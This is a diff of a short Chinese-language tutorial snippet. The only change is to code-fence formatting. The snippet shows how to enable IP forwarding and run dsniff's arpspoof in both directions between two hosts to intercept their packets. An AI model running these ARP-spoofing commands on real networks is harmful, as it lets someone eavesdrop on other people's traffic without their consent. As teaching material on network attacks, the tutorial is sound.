@@ -1,19 +1,19 @@
 ---
 
-```console 
+``` 
 shell> dpkg -L dsniff
 shell> arpspoof
 ```
 
 在使用`arpspoof`之前，為了避免封包沒有轉發，建議先開啟封包轉發功能： 
 
-```console 
+``` 
 echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
 要攔截10.0.0.1送往10.0.0.2的封包，可以執行以下的指令： 
 
-```console 
+``` 
 shell> arpspoof -i eth0 -t 10.0.0.1 10.0.0.2
 ```
 
@@ -21,7 +21,7 @@ shell> arpspoof -i eth0 -t 10.0.0.1 10.0.0.2
 
 同樣地，要攔截10.0.0.2送往10.0.0.1的封包，則使用下列的指令： 
 
-```console 
+``` 
 shell> arpspoof -i eth0 -t 10.0.0.2 10.0.0.1
 ```
 
